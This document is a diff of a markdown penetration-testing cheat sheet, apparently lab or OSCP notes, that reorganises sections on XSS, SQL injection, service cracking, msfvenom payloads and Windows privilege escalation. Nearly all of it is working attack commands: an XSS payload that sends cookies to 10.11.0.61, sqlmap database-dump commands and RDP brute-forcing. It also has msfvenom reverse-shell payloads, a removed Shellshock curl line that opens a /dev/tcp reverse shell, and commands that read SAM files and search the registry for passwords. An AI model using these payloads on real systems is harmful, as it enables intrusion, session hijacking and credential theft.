@@ -54,7 +54,7 @@ dotdotpwn -m http -h <host-ip> -o windows
 dotdotpwn -m stdout -d 8 -o windows > ddp_traversal
 ```
 
-## XSS
+### XSS
 
 ```javascript
 '">><script>i=document.createElement("img");i.src='http://10.11.0.61:5555/'+document.cookie;</script>
@@ -119,13 +119,14 @@ Using kadismus
 ## SQLi
 
 
-### sqlmap
+SQLmap
 
 ```bash
 sqlmap -u "http://website/wp/wp-content/plugins/wp-forum/feed.php?topic=-4381 " --dbms=mysql --technique=U --union-cols=7 --random-agent --dump
 
 sqlmap -u "http://website/edit_period.php?period_id=1 " --cookie="PHPSESSID=h7gtd8seldqt6vfa9igebn4tu1" --dbms=mysql --level=5 --risk=3
 ```
+
 ## Service Cracking & Enumeration
 
 RDP
@@ -278,31 +279,7 @@ ncrack -vv --user administrator -P ~/PASSWD/mega-mangled rdp://<host-ip>
 python crowbar.py -b rdp -s <host-ip>/32 -U ~/targets/0_usernames -C ~/targets/0_passwords
 ```
 
-## Files
-
-### Windows
-
-Files containing passwords
-
-```posh
-# has to be decrypted with gpp-decrypt
-C:\Windows\SYSVOL\sysvol\<domain-name>\Policies\{43383995-A780-486C-83E1-469CB7FF2BF4}\Machine\Preferences\Groups>more Groups.xml
-
-C:\Windows\repair\SAM && C:\Windows\repair\system
-```
-
-Registry
-
-```bash
-# TightVNC server
-reg query HKLM\Software\TightVNC\Server
-```
-
-
-
 ## Msfvenom Payloads
-
-### Windows
 
 ```bash
 
@@ -322,27 +299,20 @@ msfvenom -p windows/shell_reverse_tcp LPORT=6666 LHOST=10.11.0.61 -e x86/shikata
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.61 LPORT=444 -f js_le -e generic/none
 ```
 
-## Remote Exploits
-### Shellshock
-
-```bash
-python 34900.py payload=reverse pages=/cgi-bin/admin.cgi rhost=<host-ip> lhost=10.11.0.61 lport=555
-```
-
-manually
-
-```bash
- curl -H "User-Agent: () { test;};/bin/bash -i >& /dev/tcp/10.11.0.61/80 0>&1" http://website/cgi-bin/printenv
-```
-
-### shocker
-
-```bash
-python shocker.py --Host <host-ip>
-```
-
 ## Local Privilege Escalation
 ### Windows
+
+Files containing passwords
+
+```posh
+# has to be decrypted with gpp-decrypt
+C:\Windows\SYSVOL\sysvol\<domain-name>\Policies\{43383995-A780-486C-83E1-469CB7FF2BF4}\Machine\Preferences\Groups>more Groups.xml
+
+C:\Windows\repair\SAM && C:\Windows\repair\system
+```
+
+
+
 
 
 Hash Injection
@@ -419,6 +389,9 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services
 # grep registry for passwords
 reg query HKCU /f password /t REG_SZ /s
 reg query HKLM /f password /t REG_SZ /s
+
+# TightVNC server
+reg query HKLM\Software\TightVNC\Server
 ```
 
 #### sc
